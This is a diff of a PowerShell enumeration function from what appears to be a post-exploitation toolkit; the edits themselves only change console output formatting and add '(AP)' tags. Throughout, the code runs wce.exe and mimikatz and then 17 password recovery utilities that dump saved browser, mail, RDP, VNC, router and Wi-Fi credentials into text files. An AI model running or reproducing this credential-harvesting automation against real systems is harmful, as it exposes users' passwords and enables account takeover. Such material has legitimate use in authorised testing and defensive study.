@@ -55,6 +55,7 @@ Function EnumSys(){
     .\wce.exe -w > $CURRENT_PATH\output\enumerate_system\wce\credentials.txt
 
     Write-Host -ForegroundColor Blue -NoNewLine "[*] "
+    Write-Host -ForegroundColor Red -NoNewLine "(AP) "
     Write-Host "Launch mimikatz.exe...`t[3/$TOTAL]"
     Write-Host -NoNewLine "> "
     Write-Host -ForegroundColor Yellow "log ../output/enumerate_system/mimikatz/credentials.log"
@@ -68,39 +69,39 @@ Function EnumSys(){
 
     Write-Host -ForegroundColor Blue -NoNewLine "[*] "
     Write-Host "Launch Password Recovery Utilities...`t[4/$TOTAL]"
-    Write-Host -ForegroundColor Green -NoNewLine "`t[+] "; Write-Host "BulletsPassView.exe`t[1/17]"
+    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "BulletsPassView.exe`t1/17"
     cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\BulletsPassView.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\BulletsPassView.txt
-    Write-Host -ForegroundColor Green -NoNewLine "`t[+] "; Write-Host "ChromePass.exe`t[2/17]"
+    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "ChromePass.exe`t2/17"
     cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\ChromePass.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\ChromePass.txt
-    Write-Host -ForegroundColor Green -NoNewLine "`t[+] "; Write-Host "iepv.exe`t[3/17]"
+    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "iepv.exe`t`t3/17"
     cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\iepv.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\iepv.txt
-    Write-Host -ForegroundColor Green -NoNewLine "`t[+] "; Write-Host "mailpv.exe`t[4/17]"
+    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "mailpv.exe`t`t4/17"
     cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\mailpv.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\mailpv.txt
-    Write-Host -ForegroundColor Green -NoNewLine "`t[+] "; Write-Host "mspass.exe`t[5/17]"
+    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "mspass.exe`t`t5/17"
     cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\mspass.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\mspass.txt
-    Write-Host -ForegroundColor Green -NoNewLine "`t[+] "; Write-Host "netpass.exe`t[6/17]"
+    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host -ForegroundColor Red -NoNewLine "(AP) "; Write-Host "netpass.exe`t6/17"
     cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\netpass.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\netpass.txt
-    Write-Host -ForegroundColor Green -NoNewLine "`t[+] "; Write-Host "OperaPassView.exe`t[7/17]"
+    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "OperaPassView.exe`t7/17"
     cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\OperaPassView.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\OperaPassView.txt
-    Write-Host -ForegroundColor Green -NoNewLine "`t[+] "; Write-Host "PasswordFox.exe`t[8/17]"
+    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "PasswordFox.exe`t8/17"
     cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\PasswordFox.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\PasswordFox.txt
-    Write-Host -ForegroundColor Green -NoNewLine "`t[+] "; Write-Host "ProduKey.exe`t[9/17]"
+    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "ProduKey.exe`t9/17"
     cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\ProduKey.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\ProduKey.txt
-    Write-Host -ForegroundColor Green -NoNewLine "`t[+] "; Write-Host "pspv.exe`t[10/17]"
+    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "pspv.exe`t`t10/17"
     cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\pspv.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\pspv.txt
-    Write-Host -ForegroundColor Green -NoNewLine "`t[+] "; Write-Host "PstPassword.exe`t[11/17]"
+    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "PstPassword.exe`t11/17"
     cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\PstPassword.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\PstPassword.txt
-    Write-Host -ForegroundColor Green -NoNewLine "`t[+] "; Write-Host "rdpv.exe`t[12/17]"
+    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "rdpv.exe`t`t12/17"
     cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\rdpv.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\rdpv.txt
-    Write-Host -ForegroundColor Green -NoNewLine "`t[+] "; Write-Host "RouterPassView.exe`t[13/17]"
+    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "RouterPassView.exe`t13/17"
     cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\RouterPassView.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\RouterPassView.txt
-    Write-Host -ForegroundColor Green -NoNewLine "`t[+] "; Write-Host "VNCPassView.exe`t[14/17]"
+    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "VNCPassView.exe`t14/17"
     cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\VNCPassView.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\VNCPassView.txt
-    Write-Host -ForegroundColor Green -NoNewLine "`t[+] "; Write-Host "WebBrowserPassView.exe`t[15/17]"
+    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "WebBrowserPassView.exe`t15/17"
     cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\WebBrowserPassView.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\WebBrowserPassView.txt
-    Write-Host -ForegroundColor Green -NoNewLine "`t[+] "; Write-Host "WirelessKeyView.exe`t[16/17]"
+    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host -ForegroundColor Red -NoNewLine "(AP) "; Write-Host "WirelessKeyView.exe`t16/17"
     cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\WirelessKeyView.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\WirelessKeyView.txt
-    Write-Host -ForegroundColor Green -NoNewLine "`t[+] "; Write-Host "WNetWatcher.exe`t[17/17]"
+    Write-Host -ForegroundColor Green -NoNewLine "`t > "; Write-Host "WNetWatcher.exe`t17/17"
     cmd /c start $CURRENT_PATH\Password-Recovery-Utilities\WNetWatcher.exe /stext $CURRENT_PATH\output\enumerate_system\Password-Recovery-Utilities\WNetWatcher.extxte
 
     Write-Host -ForegroundColor Blue -NoNewLine "[*] "
